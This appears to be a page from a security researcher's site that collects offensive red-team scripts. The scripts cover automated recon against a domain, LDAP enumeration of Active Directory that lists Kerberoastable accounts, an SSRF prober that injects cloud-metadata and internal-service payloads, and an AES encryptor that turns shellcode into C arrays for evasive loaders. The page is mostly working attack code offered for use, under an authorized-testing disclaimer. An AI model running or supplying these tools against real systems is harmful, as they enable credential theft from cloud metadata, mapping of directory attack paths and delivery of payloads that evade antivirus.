---
layout: page
title: Custom Security Scripts
subtitle: Utility scripts and automation tools for offensive operations
permalink: /tools/custom-scripts/
---

## Custom Scripts Collection

A growing repository of operational utility scripts developed for specific red team and bug bounty tasks. All scripts are designed for authorized security testing only.

---

## Reconnaissance

### `recon-pipeline.sh` — Automated Recon Orchestrator

Chains subdomain enumeration, HTTP probing, port scanning, and nuclei scanning into one pipeline.

```bash
#!/bin/bash
# Usage: ./recon-pipeline.sh example.com
DOMAIN=$1
OUT="./recon_${DOMAIN}_$(date +%Y%m%d)"
mkdir -p $OUT

echo "[*] Phase 1: Subdomain Enumeration"
subfinder -d $DOMAIN -silent -o $OUT/subs_subfinder.txt
amass enum -passive -d $DOMAIN -o $OUT/subs_amass.txt
cat $OUT/subs_*.txt | sort -u > $OUT/all_subs.txt
echo "[+] Found $(wc -l < $OUT/all_subs.txt) unique subdomains"

echo "[*] Phase 2: HTTP Probing"
httpx -l $OUT/all_subs.txt -silent -status-code -tech-detect \
      -o $OUT/live_hosts.txt -mc 200,301,302,403,500
echo "[+] $(wc -l < $OUT/live_hosts.txt) live hosts"

echo "[*] Phase 3: Port Scanning"
naabu -list $OUT/live_hosts.txt -silent -o $OUT/ports.txt

echo "[*] Phase 4: Nuclei Scanning"
nuclei -l $OUT/live_hosts.txt -t ~/nuclei-templates/ \
       -severity critical,high,medium -o $OUT/nuclei.txt -silent

echo "[+] Recon complete! Results saved to $OUT/"
```

---

## Active Directory

### `ad-enum.py` — BloodHound-less AD Enumerator

Enumerates key AD objects using LDAP without requiring BloodHound, outputting clean JSON for custom analysis.

```python
#!/usr/bin/env python3
"""
ad-enum.py - Lightweight Active Directory Enumerator
Usage: python3 ad-enum.py -u user -p pass -d domain.local -dc 10.10.10.1
"""
from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
import argparse, json

def enumerate_ad(args):
    server = Server(args.dc, get_info=ALL)
    conn = Connection(server, user=f"{args.domain}\\{args.user}",
                     password=args.password, authentication=NTLM, auto_bind=True)
    
    results = {"users": [], "computers": [], "groups": [], "kerberoastable": []}
    base_dn = ','.join([f"DC={x}" for x in args.domain.split('.')])
    
    # Enumerate users
    conn.search(base_dn, '(objectClass=user)', attributes=['sAMAccountName',
                'servicePrincipalName', 'memberOf', 'adminCount', 'userAccountControl'])
    for entry in conn.entries:
        user = {"name": str(entry.sAMAccountName), "adminCount": str(entry.adminCount)}
        if entry.servicePrincipalName:
            user["spn"] = list(entry.servicePrincipalName)
            results["kerberoastable"].append(user["name"])
        results["users"].append(user)
    
    print(json.dumps(results, indent=2))
```

---

## Web Application

### `ssrf-tester.py` — Automated SSRF Probe

Tests a list of URLs for Server-Side Request Forgery by injecting various internal targets and out-of-band callbacks.

```python
#!/usr/bin/env python3
"""
ssrf-tester.py - Automated SSRF Probe
Usage: python3 ssrf-tester.py -l urls.txt -b http://collaborator.net/xyz
"""
import requests, argparse

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",       # AWS IMDSv1
    "http://100.100.100.200/latest/meta-data/",        # Alibaba Cloud
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://localhost:22",                              # Internal SSH
    "http://127.0.0.1:6379",                           # Redis
    "http://0.0.0.0:8080",                             # Internal services
]

def test_ssrf(urls_file, burp_callback):
    with open(urls_file) as f:
        urls = [u.strip() for u in f.readlines()]
    
    for url in urls:
        for payload in SSRF_PAYLOADS:
            # Inject in common parameter positions
            for param in ['url', 'redirect', 'dest', 'target', 'uri', 'path', 'fetch']:
                test_url = f"{url}?{param}={payload}"
                try:
                    r = requests.get(test_url, timeout=3, allow_redirects=False)
                    if r.status_code in [200, 302] and len(r.content) > 100:
                        print(f"[!] Potential SSRF: {test_url}")
                        print(f"    Status: {r.status_code} | Size: {len(r.content)}")
                except Exception: pass
```

---

## Payload Generation

### `shellcode-encrypt.py` — AES-256 Shellcode Encryptor

Encrypts raw shellcode with AES-256 CBC and outputs a C array for use in custom loaders.

```python
#!/usr/bin/env python3
"""
shellcode-encrypt.py - AES-256 Shellcode Encryptor
Usage: python3 shellcode-encrypt.py --input shellcode.bin --output encrypted.c
"""
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import sys, argparse

def encrypt_shellcode(input_file, output_file):
    with open(input_file, 'rb') as f:
        shellcode = f.read()
    
    key = get_random_bytes(32)    # AES-256
    iv  = get_random_bytes(16)    # CBC IV
    
    # Pad shellcode to block size
    pad_len = 16 - (len(shellcode) % 16)
    shellcode += bytes([pad_len] * pad_len)
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(shellcode)
    
    def to_c_array(name, data):
        hex_bytes = ', '.join(f'0x{b:02x}' for b in data)
        return f"unsigned char {name}[] = {{{hex_bytes}}};\nunsigned int {name}_len = {len(data)};\n"
    
    with open(output_file, 'w') as f:
        f.write("// Auto-generated by shellcode-encrypt.py\n")
        f.write(to_c_array("enc_shellcode", encrypted))
        f.write(to_c_array("aes_key", key))
        f.write(to_c_array("aes_iv", iv))
    
    print(f"[+] Encrypted {len(shellcode)} bytes -> {output_file}")
    print(f"[+] Key: {key.hex()}")
    print(f"[+] IV:  {iv.hex()}")
```

---

## GitHub Repository

> 🔗 [github.com/vulnquest58/custom-scripts](https://github.com/vulnquest58/custom-scripts)
